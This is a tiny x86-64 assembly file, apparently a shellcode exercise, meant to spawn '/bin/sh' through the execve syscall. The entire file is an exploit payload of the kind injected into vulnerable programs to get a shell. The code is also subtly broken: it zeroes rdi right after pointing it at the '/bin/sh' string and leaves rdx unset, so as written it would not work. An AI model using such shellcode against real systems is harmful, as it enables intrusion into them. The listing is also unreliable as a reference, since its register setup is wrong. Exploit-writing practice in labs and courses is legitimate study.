# gcc shellcode.s -nostdlib
.global _start
.intel_syntax noprefix

_start:

  mov rdi, 0x68732f6e69622f
  push rdi
  mov rdi, rsp
  xor rsi, rsi
  xor rdi, rdi
  mov eax, 0x3b
  syscall


